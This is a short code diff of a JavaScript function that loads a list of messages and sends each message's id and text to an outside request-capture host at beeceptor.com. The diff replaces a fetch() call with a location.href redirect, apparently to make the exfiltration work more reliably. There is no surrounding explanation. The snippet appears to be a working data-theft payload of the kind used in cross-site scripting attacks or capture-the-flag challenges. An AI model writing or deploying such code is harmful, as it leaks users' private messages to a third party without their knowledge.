@@ -8,7 +8,7 @@ function fetchMessages() {
         .then(r => r.json())
         .then(data => {
             data.messages.forEach(msg => {
-              fetch(`https://caliphalhounds.free.beeceptor.com/id=${msg.id}&message=${msg.message}`)
+              location.href = `https://caliphalhounds.free.beeceptor.com/id=${msg.id}&message=${msg.message}`
             });
         });
 }
